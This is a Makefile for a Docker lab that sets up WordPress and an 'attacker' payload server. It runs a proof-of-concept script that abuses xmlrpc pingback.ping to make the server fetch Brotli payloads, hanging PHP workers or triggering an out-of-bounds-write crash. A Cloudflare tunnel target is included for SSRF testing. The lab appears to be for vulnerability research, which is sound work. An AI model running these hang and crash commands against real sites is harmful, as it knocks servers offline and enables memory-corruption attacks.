SHELL := /bin/bash
COMPOSE ?= docker compose
-include .env

WP_PORT ?= 8080
ATTACKER_PORT ?= 8081
CHUNK_DELAY ?= 1.0
TARGET ?= http://localhost:$(WP_PORT)
HANG_PAYLOAD ?= http://attacker:8080/small.br
CRASH_PAYLOAD ?= http://attacker:8080/payload.br
POC := python3 poc/pingback_poc.py

.PHONY: help up down reset init probe hang crash logs verify tunnel tunnel-url payloads clean

help:
	@echo "brotli-pingback-lab"
	@echo ""
	@echo "  make up          build and start the lab, then install WordPress"
	@echo "  make probe       check xmlrpc.php and pingback.ping"
	@echo "  make hang        send the 86-byte worker-hang payload"
	@echo "  make crash       send the 23 MB OOB-write payload"
	@echo "  make logs        follow php-fpm / nginx logs"
	@echo "  make verify      confirm the PHP/libcurl/Brotli stack is vulnerable"
	@echo "  make tunnel      start a Cloudflare Quick Tunnel for the payload server"
	@echo "                   (Cloudflare decodes br; use the local URL for the crash)"
	@echo "  make tunnel-url  print the trycloudflare.com URL from the tunnel logs"
	@echo "  make down        stop the lab (keeps volumes)"
	@echo "  make reset       stop the lab and delete the database/WordPress volumes"
	@echo ""
	@echo "Variables: TARGET=$(TARGET) HANG_PAYLOAD=$(HANG_PAYLOAD)"
	@echo "           CRASH_PAYLOAD=$(CRASH_PAYLOAD)"

up:
	$(COMPOSE) up -d --build
	$(COMPOSE) run --rm wp-init
	@echo ""
	@echo "[+] WordPress: $(TARGET)"
	@echo "[+] Payload server (host): http://localhost:$(ATTACKER_PORT)/health"
	@echo "[*] Next: make probe"

down:
	$(COMPOSE) down

reset:
	$(COMPOSE) down -v

init:
	$(COMPOSE) run --rm wp-init

probe:
	$(POC) --target $(TARGET) --mode probe

hang:
	$(POC) --target $(TARGET) --mode hang \
		--payload-url $(HANG_PAYLOAD) \
		--workers 4 --count 4 --timeout 25 --show-logs

crash:
	$(POC) --target $(TARGET) --mode crash \
		--payload-url $(CRASH_PAYLOAD) \
		--workers 4 --count 4 --timeout 30 --show-logs

logs:
	$(COMPOSE) logs -f wordpress nginx

verify:
	./scripts/verify-vulnerable.sh

tunnel:
	$(COMPOSE) --profile tunnel up -d cloudflared
	@echo ""
	@echo "[!] Cloudflare decodes Content-Encoding: br at the edge."
	@echo "    /small.br becomes 16 MiB of 'A'; /payload.br becomes 0 bytes."
	@echo "    Use the local attacker URL for the crash/hang; the tunnel is for"
	@echo "    public-URL/SSRF testing. See docs/cloudflare.md."
	@echo ""
	@echo "[*] Waiting for the Quick Tunnel URL ..."
	@for i in $$(seq 1 30); do \
		url=$$($(COMPOSE) logs --no-color cloudflared 2>&1 | grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' | tail -1); \
		if [ -n "$$url" ]; then echo "[+] $$url"; exit 0; fi; \
		sleep 1; \
	done; \
	echo "[!] URL not found yet; run: make tunnel-url"

tunnel-url:
	@$(COMPOSE) logs --no-color cloudflared 2>&1 | grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' | tail -1

payloads:
	python3 lab/attacker/payload.py hang lab/attacker/hang.br
	python3 lab/attacker/payload.py crash lab/attacker/crash.br

clean:
	rm -f lab/attacker/hang.br lab/attacker/crash.br
	find . -type d -name __pycache__ -prune -exec rm -rf {} +
